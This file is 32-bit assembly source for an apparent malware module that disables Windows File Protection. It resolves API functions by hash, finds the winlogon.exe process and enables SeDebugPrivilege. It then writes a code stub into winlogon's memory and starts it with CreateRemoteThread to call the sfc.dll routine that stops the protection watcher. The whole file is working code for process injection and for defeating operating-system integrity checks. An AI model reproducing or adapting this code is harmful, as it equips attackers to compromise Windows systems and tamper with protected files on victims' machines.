[BITS 32]

%strlen			wlgon_len	'winlogon.exe'
TH32CS_SNAPPROCESS	EQU	2
PROCESS_ALL_ACCESS	EQU	0x1f0fff
TOKEN_ADJUST_PRIVILEGES	EQU	32
SE_PRIVILEGE_ENABLED	EQU	2
MEM_RELEASE		EQU	0x8000



@SFC_Disable:
	push ebp
	mov ebp, esp

	call [edi + GetVersion]
	or eax, eax
	js .end

	push 'SFC'
	push esp
	call [edi - __LOADLIBRARY]
	or eax, eax
	jz .end
	push eax

	push byte 2
	push eax
	call [edi - __GETPROCADDR]
	or eax, eax
	jz .end
	push eax


%ifndef	hSfc
	%define	hSfc		[ebp - 0x8]
%else
	%error "macro defined twice"
%endif

%ifndef	sfc_terminate
	%define	sfc_terminate	[ebp - 0xC]
%else
	%error "macro defined twice"
%endif

%ifndef	GetApi
	%define	GetApi		[ebp - 0x10]
%else
	%error "macro defined twice"
%endif

	call startcode
	call .LoadApi

	OFFS		EQU	0x14

.k32api
	FreeLibrary			EQU	((0*4) + OFFS)
		dd 0x4dc9d5a0
	CreateToolhelp32Snapshot	EQU	((1*4) + OFFS)
		dd 0xe454dfed
	Process32First			EQU	((2*4) + OFFS)
		dd 0x3249baa7
	Process32Next			EQU	((3*4) + OFFS)
		dd 0x4776654a
	OpenProcess			EQU	((4*4) + OFFS)
		dd 0xefe297c0
	VirtualAllocEx			EQU	((5*4) + OFFS)
		dd 0x06e1a959c
	CreateRemoteThread		EQU	((6*4) + OFFS)	
		dd 0x72bd9cdd
	VirtualFreeEx			EQU	((7*4) + OFFS)
		dd 0xc3b4eb78
	GetCurrentProcess		EQU	((8*4) + OFFS)
		dd 0x7b8f17e6
	WriteProcessMemory		EQU	((9*4) + OFFS)
		dd 0xd83d6aa1

	_K32APINUM	EQU	(($ - .k32api)/4)

.LoadApi
	pop esi
	push byte _K32APINUM
	pop ecx
	mov ebx, [edi - __KERNEL32]

.LoadNextApi
	push ecx
	lodsd
	xchg edx, eax		; hash
	call GetApi		; LGetProcAddress
	jecxz .end
	pop ecx
	push eax
	loop .LoadNextApi

	mov ch, 3
	sub esp, ecx		;0x300 bytes
	push ecx
	push byte TH32CS_SNAPPROCESS
	call [ebp - CreateToolhelp32Snapshot]
	cmp eax, byte -1
	je .free

	xchg ebx, eax

	push esp
	push ebx
	call [ebp - Process32First]

.loop1
	or eax, eax
	jz .close

	lea edx, [esp + 0x24]		;szExeFile
	push edx
	push edx
	call [edi + lstrlenA]
	pop edx
	cmp eax, wlgon_len
	jl .nextp

	add edx, eax
	sub edx, byte wlgon_len

	call .1
	db 'winlogon.exe',0

.1
	push edx
	call [edi + lstrcmpiA]
	or eax, eax
	jnz .nextp

	push ebx
	call [edi + CloseHandle]
	push dword [esp + 8]	;Winlogon PID

	jmp short @AdjustPrivileges


.nextp
	push esp
	push ebx
	call [ebp - Process32Next]
	jmp short .loop1

.close
	push ebx
	call [edi + CloseHandle]

.free
	push dword hSfc
	call [ebp - FreeLibrary]

.end
	leave
	ret



@AdjustPrivileges
	push byte 0
	call .adv
	db 'advapi32',0

.adv
	call [edi - __LOADLIBRARY]
	or eax, eax
	jz .exit
	xchg ebx, eax

	push esi
	push esp
	push byte TOKEN_ADJUST_PRIVILEGES
	call [ebp - GetCurrentProcess]
	push eax
	mov edx, 0x591ea70f	;OpenProcessToken
	call GetApi
	call eax
	pop esi			;TokenHandle
	or eax, eax
	jz .exit

	push byte SE_PRIVILEGE_ENABLED
	push eax
	push eax
	push esp			;lpLuid
	call .1
	db 'SeDebugPrivilege',0

.1
	push byte 0
	mov edx, 0x97e8c2a2	;LookupPrivilegeValueA
	call GetApi
	call eax

	push byte 1
	mov edx, esp		;TOKEN_PRIVILEGES

	xor eax, eax
	push eax
	push eax
	push eax
	push edx
	push eax
	push esi
	mov edx, 0x24488a0f	;AdjustTokenPrivileges
	call GetApi
	call eax
	add esp, byte 0x14
	push eax


.closeToken
	push esi
	call [edi + CloseHandle]

.exit
	pop eax
	or eax, eax
	jz @SFC_Disable.free

	push byte 0
	push PROCESS_ALL_ACCESS
	call [ebp - OpenProcess]
	or eax, eax
	jz @SFC_Disable.free

	xchg ebx, eax
	push byte PAGE_EXECUTE_READWRITE
	pop ecx
	push ecx
	shl ecx, 6				; 0x1000 (MEM_COMMIT)
	push ecx
	push byte RemoteThread_size
	push byte 0
	push ebx
	call [ebp - VirtualAllocEx]
	or eax, eax
	jz .close

	xchg esi, eax
	push byte 0
	push byte RemoteThread_size
	call @Get_RemoteThread
	push esi
	push ebx
	call [ebp - WriteProcessMemory]
	or eax, eax
	jz .cleanup

	xor eax, eax
	push eax
	push eax
	push dword sfc_terminate	;lpArgument
	push esi			;lpThreadFunc
	push eax
	push eax
	push ebx
	call [ebp - CreateRemoteThread]
	or eax, eax
	jz .cleanup

	push eax
	push dword (60*1000)	;1 min.
	push eax
	call [edi + WaitForSingleObject]
	or eax, eax
	jnz .close
	call [edi + CloseHandle]

.cleanup
	push MEM_RELEASE
	push byte 0
	push esi
	push ebx
	call [ebp - VirtualFreeEx]

.close
	push ebx
	call [edi + CloseHandle]
.exit2
	jmp @SFC_Disable.free




@Get_RemoteThread:
	pop eax
	call eax

@RemoteThread:
	call [esp + 4]
	ret
RemoteThread_size	EQU	($ - @RemoteThread)